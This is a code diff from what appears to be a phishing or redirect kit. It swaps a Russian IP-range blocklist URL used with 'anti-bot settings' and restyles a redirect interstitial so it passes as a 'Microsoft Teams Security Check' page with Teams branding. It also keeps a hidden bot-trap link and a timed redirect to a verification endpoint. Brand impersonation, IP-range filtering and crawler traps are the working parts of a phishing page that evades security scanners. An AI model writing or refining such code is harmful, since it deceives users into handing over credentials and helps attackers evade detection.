@@ -68,7 +68,7 @@ VPN_CIDR_URL = "https://raw.githubusercontent.com/X4BNet/lists_vpn/main/output/v
 LUMEN_CIDR_URL = "https://raw.githubusercontent.com/SecOps-Institute/Level3-IPs/master/level3.netset"
 DATACAMP_CIDR_URL = "https://www.datacamp.com/network"  # Placeholder, may need RIPE lookup
 CHINA_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_cn.netset"
-RUSSIA_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_ru.netset"
+RUSSIA_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_rf.netset"
 JAPAN_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_jp.netset"
 
 # Anti-bot settings
@@ -1108,27 +1108,54 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <meta http-equiv="refresh" content="3;url={{ verify_url }}">
-                <title>Verifying...</title>
+                <title>Microsoft Teams</title>
                 <style>
-                    body { 
-                        background: linear-gradient(to bottom, #252423, #6264a7); 
-                        color: #ffffff; 
-                        font-family: Arial, sans-serif;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        min-height: 100vh;
+                    body {
                         margin: 0;
+                        padding: 2rem 1rem;
+                        background-color: #f3f2f9;
+                        font-family: 'Segoe UI', sans-serif;
+                        color: #444;
+                        display: flex;
+                        flex-direction: column;
+                        align-items: center;
+                        justify-content: center;
+                        min-height: 100vh;
                         text-align: center;
                     }
-                    .message { font-size: 1.5rem; }
+                    h3 {
+                        font-size: 1.1rem;
+                        font-weight: 500;
+                        margin: 0.4rem 0;
+                        color: #444;
+                    }
+                    p {
+                        font-size: 0.9rem;
+                        font-weight: 400;
+                        color: #666;
+                        margin: 0.2rem 0 1.5rem;
+                    }
+                    .loader {
+                        width: 26px;
+                        height: 26px;
+                        border: 3px solid #ddd;
+                        border-top: 3px solid #6264a7;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                    }
+                    @keyframes spin {
+                        to { transform: rotate(360deg); }
+                    }
+                    a {
+                        display: none;
+                    }
                 </style>
             </head>
             <body>
-                <div class="message">
-                    New security features in teams. Verifying your request... Please wait.
-                    <a href="/bot-trap/{{ bot_trap_token }}" style="display:none">trap</a>
-                </div>
+                <h3>Microsoft Teams Security Check</h3>
+                <p>We are validating your request with the latest Microsoft Teams security standards.</p>
+                <div class="loader"></div>
+                <a href="/bot-trap/{{ bot_trap_token }}">trap</a>
             </body>
             </html
         """, verify_url=url_for('verify', token=verify_token), bot_trap_token=secrets.token_hex(16))
